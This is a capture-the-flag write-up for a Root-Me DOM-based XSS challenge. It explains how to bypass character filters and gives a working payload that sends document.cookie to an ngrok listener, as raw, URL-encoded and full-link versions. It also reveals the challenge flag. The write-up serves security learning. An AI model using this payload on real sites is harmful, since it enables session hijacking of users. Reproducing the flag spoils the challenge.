# XSS DOM Based - Filters Bypass

**Point**: 50 Points  

**Description**: Steal the admin’s session cookie.

## Solution:

There's a simple lucky random number

<p align="center"><img width="350px" height="150px" src="https://user-images.githubusercontent.com/48288606/159757819-ea21fc4f-4d09-4a96-a133-c48bdb14e111.png"/></p>

Try to enter `123` and view where our result is reflected in source code.

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159758242-a6e8b484-209c-4e2c-85d8-d13a8f735282.png" /></p>

Try various of input, I have found some character that server filter: `"` `+` `<>` `;` `http:` `https:`. How to by pass these things ?
- We inject to the middle of code without any tags. So we don't need `<>`
- `"` for escaping. OK! What if I use `'` :))
- `+`, Not prohibiting `()` means we can play with function. Let `concat()` do it works.
- `;`, prevent us from ending our command. Just use `//` to comment out the rest of code.
- `[http | https]:`, we could seperate these strings and concatenate it together.

Try if XSS is possible with `'.concat(alert(1)) //`

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159759803-fbb65a57-2136-4b54-bad8-6f4baecfbdf7.png" /></p>

Not too hard?. Now this proves XSS can be in action. We have to get the **cookie** from the victim. Payload will look like this:

```text
'.concat(document.location='ht'.concat('tp{your_server_link_site}?cookie=').concat(document.cookie)) //
```

Let's take action step-by-step:

1. Run PHP server with **localhost** and optional **port** without any content: `php -S localhost:4444 `

2. Public our server by tunneling. I use **ngrok** to serve this purpose:
   - Connect to ngrok with your account token: `ngrok authtoken {your_account_token}`
   - Tunneling our local site to public network with port specified above: `ngrok http 4444`
   - Get the public link we get from ngrok and create with payload above.
   ![image](https://user-images.githubusercontent.com/48288606/159753459-1bd85e80-cda4-41b1-8235-511514bee716.png)

3. Send our payload to cookie **status** and reload page:
```text
'.concat(document.location='ht'.concat('tp://6b48-123-21-33-87.ngrok.io?cookie=').concat(document.cookie)) //
``` 

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/159760446-ec995288-b1b5-4aba-9ecb-d1ca822da4c1.png" /> </p>

Our payload is working.

There's one more problem we have to deal with. When we submit, the page quickly directs to our site so we can't have enough time to "collect" the URL. We should decode our payload ([Use this!](https://www.urlencoder.org/) and set **number** param with decoded value for creating our own links.

Encoded payload:

```text
%27.concat%28document.location%3D%27ht%27.concat%28%27tp%3A%2F%2F6b48-123-21-33-87.ngrok.io%3Fcookie%3D%27%29.concat%28document.cookie%29%29%20%2F%2F
```
Assign it into **number** parameter in URL query. We have full payload:

```text
http://challenge01.root-me.org/web-client/ch33/index.php?number=%27.concat%28document.location%3D%27ht%27.concat%28%27tp%3A%2F%2F6b48-123-21-33-87.ngrok.io%3Fcookie%3D%27%29.concat%28document.cookie%29%29%20%2F%2F
```
**NOTE: You can check this payload by put it directly to URL search bar**

Move to "Contact" section. Send our payload URL to server. Wait for a while, check whether our server has received cookie or not.

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/159761193-2c8d1d40-4b82-48af-a788-a0142a2bbd0b.png" /> </p>

FLag: **rootme{FilTERS_ByPass_DOm_BASEd_XSS}**

